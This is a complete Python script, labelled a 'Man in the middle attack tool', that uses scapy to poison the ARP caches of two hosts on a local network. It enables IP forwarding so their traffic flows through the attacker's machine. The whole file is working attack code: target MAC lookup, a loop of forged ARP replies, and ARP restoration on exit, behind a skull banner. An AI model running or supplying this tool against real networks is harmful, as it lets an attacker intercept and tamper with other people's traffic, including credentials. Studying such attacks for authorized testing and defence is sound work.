#!/usr/bin/python
# -*- coding:utf-8 -*-

from scapy.all import *
from os import system
from time import sleep
from threading import Thread

def getIPaddr(iface):
    """
    Get IP address from interface.
    """
    for elem in conf.route.routes:
        if elem[2] != "0.0.0.0" and elem[3] == iface:
            return elem[4]

def getHWaddr(iface, ip):
    """
    Get MAC address from IP address (ARP request).
    """ 
    packet = Ether(src=get_if_hwaddr(iface), dst="ff:ff:ff:ff:ff:ff", type=0x806) / ARP(op=1, hwsrc=get_if_hwaddr(iface), psrc=getIPaddr(iface), pdst=ip)
    resp,_ = srp(packet, verbose=0)
    return resp[0][1].hwsrc

def enableIPForwarding():
    system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disableIPForwarding():
    system("echo 0 > /proc/sys/net/ipv4/ip_forward")


class ARPPoisoner (Thread):

    """
    Object to poison arp tables and mitm by making all the traffic go in our machine.
    """

    def __init__(self, iface, attacker_mac, host_1_ip, host_2_ip, delay):
        Thread.__init__(self)
        self.attacker_mac = attacker_mac
        self.host_1_ip = host_1_ip
        self.host_2_ip = host_2_ip
        self.host_1_mac = getHWaddr(iface, host_1_ip)
        self.host_2_mac = getHWaddr(iface, host_2_ip)
        self.delay = delay
        self.cont = True

    def reARP(self):
        """
        Re-establish normal connexions after attack.
        """
        packet_1 = Ether(src=self.attacker_mac, dst=self.host_2_mac, type=0x806) / ARP(op=2, hwsrc=self.host_1_mac, psrc=self.host_1_ip, hwdst="ff:ff:ff:ff:ff:ff")
        packet_2 = Ether(src=self.attacker_mac, dst=self.host_1_mac, type=0x806) / ARP(op=2, hwsrc=self.host_2_mac, psrc=self.host_2_ip, hwdst="ff:ff:ff:ff:ff:ff")
        sendp(packet_1, count=10, verbose=0)
        sendp(packet_2, count=10, verbose=0)

    def run(self):
        packet_1 = Ether(src=self.attacker_mac, dst=self.host_1_mac) / ARP(op=2, hwsrc=self.attacker_mac, psrc=self.host_2_ip, hwdst=self.host_1_mac, pdst=self.host_1_ip)
        packet_2 = Ether(src=self.attacker_mac, dst=self.host_2_mac) / ARP(op=2, hwsrc=self.attacker_mac, psrc=self.host_1_ip, hwdst=self.host_2_mac, pdst=self.host_2_ip)

        while self.cont:
            sendp(packet_1, verbose=0)
            sendp(packet_2, verbose=0)
            sleep(self.delay)

    def stop(self):
        self.cont = False
        self.reARP()

if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument("INTERFACE", metavar="inter", type=str, help="Interface to use (in managed mode)")
    parser.add_argument("HOST_1", metavar="host1", type=str, help="First target")
    parser.add_argument("HOST_2", metavar="host2", type=str, help="Second target")
    parser.add_argument("-d", "--delay", action="store", default=5, type=int, dest="delay", help="Time between each spoofed arp packet")

    args = parser.parse_args()

    banner = '                   uuuuuuu\n\
              uu$$$$$$$$$$$uu\n\
           uu$$$$$$$$$$$$$$$$$uu\n\
          u$$$$$$$$$$$$$$$$$$$$$u\n\
         u$$$$$$$$$$$$$$$$$$$$$$$u\n\
        u$$$$$$$$$$$$$$$$$$$$$$$$$u\n\
        u$$$$$$$$$$$$$$$$$$$$$$$$$u\n\
        u$$$$$$"   "$$$"   "$$$$$$u\n\
        "$$$$"      u$u       $$$$"\n\
         $$$u       u$u       u$$$\n\
         $$$u      u$$$u      u$$$\n\
          "$$$$uu$$$   $$$uu$$$$"\n\
           "$$$$$$$"   "$$$$$$$"\n\
             u$$$$$$$u$$$$$$$u\n\
              u$"$"$"$"$"$"$u\n\
    uu        $$u$ $ $ $ $u$$       uuu\n\
    $$$        $$$$$u$u$u$$$       u$$$$\n\
    $$$$uu      "$$$$$$$$$"     uu$$$$$$\n\
    $$$$$$$$$uu    """""    uuuu$$$$$$$$$$\n\
    $"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"\n\
    "      ""$$$$$$$$$$$uu ""$"""\n\
            uuuu ""$$$$$$$$$$uuu\n\
    $$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$\n\
    $$$$$$$$$""""           ""$$$$$$$$$$$"\n\
    "$$$$$"                      ""$$$$""\n\
      $$$"                         $$$$"\n\
    '

    print("\n")
    print(" ****************** Man in the middle attack tool ****************** ")
    print("\n")
    print(banner)
    print("\n\n")

    print("Ctrl + C to quit\n\n")

    if not args.INTERFACE in get_if_list():
        print("[-] Could not find interface {}".format(args.INTERFACE))
        exit(0)

    poisoner = ARPPoisoner( args.INTERFACE, get_if_hwaddr(args.INTERFACE), args.HOST_1, args.HOST_2, args.delay )

    try:
        # Attack
        enableIPForwarding()
        print("[*] Enabled IP forwarding...")
        poisoner.start()
        print("[+] Successfully triggered ARP poisoner")

        while True:
            sleep(1)

    except:

        print("\n\n")
        # Stopping the attack
        poisoner.stop()
        print("[*] Re-arped targets")
        disableIPForwarding()
        print("[*] Disabled IP forwarding")
        print("\n\nGoodbye :)")
